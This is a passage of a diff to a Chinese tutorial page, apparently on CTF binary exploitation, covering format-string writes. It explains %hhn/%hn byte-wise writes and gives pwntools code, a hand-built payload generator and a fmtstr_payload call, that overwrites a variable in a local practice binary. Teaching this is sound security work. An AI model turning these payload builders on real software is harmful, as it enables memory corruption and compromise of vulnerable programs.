+<li>hh 对于整数类型，printf期待一个从char提升的int尺寸的整型参数</li>
+<li>h 对于整数类型，printf期待一个从short提升的int尺寸的整型参数</li>
+</ul>
+<p>所以说，我们可以利用 %hhn 向某个地址写入单字节，利用 %hn 向某个地址写入双字节。这里，我们以单字节为例</p>
+<p>我们可以从 ida 中得到 b 的地址 <strong>0x804C01C</strong> ，则 payload 大致如下</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">p32</span><span class="p">(</span><span class="mh">0x0804C01C</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x0804C01D</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x0804C01E</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x0804C01F</span><span class="p">)</span><span class="o">+</span><span class="n">pad1</span><span class="o">+</span><span class="err">&#39;</span><span class="o">%</span><span class="mi">6</span><span class="n">$n</span><span class="err">&#39;</span><span class="o">+</span><span class="n">pad2</span><span class="o">+</span><span class="err">&#39;</span><span class="o">%</span><span class="mi">7</span><span class="n">$n</span><span class="err">&#39;</span><span class="o">+</span><span class="n">pad3</span><span class="o">+</span><span class="err">&#39;</span><span class="o">%</span><span class="mi">8</span><span class="n">$n</span><span class="err">&#39;</span><span class="o">+</span><span class="n">pad4</span><span class="o">+</span><span class="err">&#39;</span><span class="o">%</span><span class="mi">9</span><span class="n">$n</span><span class="err">&#39;</span>
+</code></pre></div>
+<p>可以通过如下模板计算：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span><span class="p">)</span>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./fmtstr&#39;</span><span class="p">)</span>
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="k">def</span> <span class="nf">fmt</span><span class="p">(</span><span class="n">prev</span><span class="p">,</span> <span class="n">word</span><span class="p">,</span> <span class="n">index</span><span class="p">):</span> 
+<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>    <span class="k">if</span> <span class="n">prev</span> <span class="o">&lt;</span> <span class="n">word</span><span class="p">:</span> 
+<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>        <span class="n">result</span> <span class="o">=</span> <span class="n">word</span> <span class="o">-</span> <span class="n">prev</span> 
+<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>        <span class="n">fmtstr</span> <span class="o">=</span> <span class="s2">&quot;%&quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;c&quot;</span> 
+<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>    <span class="k">elif</span> <span class="n">prev</span> <span class="o">==</span> <span class="n">word</span><span class="p">:</span> 
+<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>        <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span> 
+<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>    <span class="k">else</span><span class="p">:</span> 
+<a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>        <span class="n">result</span> <span class="o">=</span> <span class="mi">256</span> <span class="o">+</span> <span class="n">word</span> <span class="o">-</span> <span class="n">prev</span> 
+<a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a>        <span class="n">fmtstr</span> <span class="o">=</span> <span class="s2">&quot;%&quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;c&quot;</span> 
+<a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a>
+<a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a>    <span class="n">fmtstr</span> <span class="o">+=</span> <span class="s2">&quot;%&quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;$hhn&quot;</span> 
+<a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a>    <span class="k">return</span> <span class="n">fmtstr</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+<a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a>
+<a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a><span class="k">def</span> <span class="nf">fmt_str</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">target</span><span class="p">):</span> 
+<a id="__codelineno-9-21" name="__codelineno-9-21" href="#__codelineno-9-21"></a>    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;&quot;</span> 
+<a id="__codelineno-9-22" name="__codelineno-9-22" href="#__codelineno-9-22"></a>
+<a id="__codelineno-9-23" name="__codelineno-9-23" href="#__codelineno-9-23"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span> 
+<a id="__codelineno-9-24" name="__codelineno-9-24" href="#__codelineno-9-24"></a>        <span class="k">if</span> <span class="n">size</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span> 
+<a id="__codelineno-9-25" name="__codelineno-9-25" href="#__codelineno-9-25"></a>            <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">addr</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> 
+<a id="__codelineno-9-26" name="__codelineno-9-26" href="#__codelineno-9-26"></a>        <span class="k">else</span><span class="p">:</span> 
+<a id="__codelineno-9-27" name="__codelineno-9-27" href="#__codelineno-9-27"></a>            <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> 
+<a id="__codelineno-9-28" name="__codelineno-9-28" href="#__codelineno-9-28"></a>
+<a id="__codelineno-9-29" name="__codelineno-9-29" href="#__codelineno-9-29"></a>    <span class="n">prev</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> 
+<a id="__codelineno-9-30" name="__codelineno-9-30" href="#__codelineno-9-30"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span> 
+<a id="__codelineno-9-31" name="__codelineno-9-31" href="#__codelineno-9-31"></a>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">fmt</span><span class="p">(</span><span class="n">prev</span><span class="p">,</span> <span class="p">(</span><span class="n">target</span> <span class="o">&gt;&gt;</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">,</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> 
+<a id="__codelineno-9-32" name="__codelineno-9-32" href="#__codelineno-9-32"></a>        <span class="n">prev</span> <span class="o">=</span> <span class="p">(</span><span class="n">target</span> <span class="o">&gt;&gt;</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span> 
+<a id="__codelineno-9-33" name="__codelineno-9-33" href="#__codelineno-9-33"></a>
+<a id="__codelineno-9-34" name="__codelineno-9-34" href="#__codelineno-9-34"></a>    <span class="k">return</span> <span class="n">payload</span> 
+<a id="__codelineno-9-35" name="__codelineno-9-35" href="#__codelineno-9-35"></a>
+<a id="__codelineno-9-36" name="__codelineno-9-36" href="#__codelineno-9-36"></a><span class="n">payload</span> <span class="o">=</span> <span class="n">fmt_str</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mh">0x0804C01C</span><span class="p">,</span><span class="mh">0x12345678</span><span class="p">)</span>
+<a id="__codelineno-9-37" name="__codelineno-9-37" href="#__codelineno-9-37"></a>
+<a id="__codelineno-9-38" name="__codelineno-9-38" href="#__codelineno-9-38"></a><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</code></pre></div>
+<p>结果如下：</p>
+<p><img alt="res3.png" src="../assets/fmtstr-res3.png" /></p>
+<h5 id="fmtstr_payload-payload">使用 fmtstr_payload 构造 payload<a class="headerlink" href="#fmtstr_payload-payload" title="Permanent link">&para;</a></h5>
+<p>fmtstr_payload 函数有如下参数</p>
+<ul>
+<li><strong>offset</strong>(int): 控制的格式化字符串的第一个偏移</li>
+<li><strong>writes</strong>(dict): 带有地址和对应值的字典 <code>{addr: value, addr2: value2}</code></li>
+<li><strong>numbwritten</strong>(int): printf 函数已写入的字节数</li>
+<li><strong>write_size</strong>(str): 必须为“byte”、“short”或“int”，告诉函数如何逐字节写入</li>
+<li><strong>overflows</strong>(int): 允许多少额外溢出，用于减少格式化字符串的长度</li>
+<li><strong>strategy</strong>(str):  'fast' 或 'small' , 默认为 small，fast 可用于有很多写入时 </li>
+<li><strong>no_dollars</strong>(bool): 使用或不使用 $ 符号生成有效负载的标志</li>
+</ul>
+<p>除 offset 和 writes 外通常省略，例如给 b 写入 0x12345678：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./fmtstr&#39;</span><span class="p">)</span>
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,{</span><span class="mh">0x804C01C</span><span class="p">:</span><span class="mh">0x12345678</span><span class="p">})</span>
+<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>
+<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</code></pre></div>
+<p>结果如下：</p>
+<p><img alt="res4.png" src="../assets/fmtstr-res4.png" /></p>
 
   <hr>
 <div class="md-source-file">
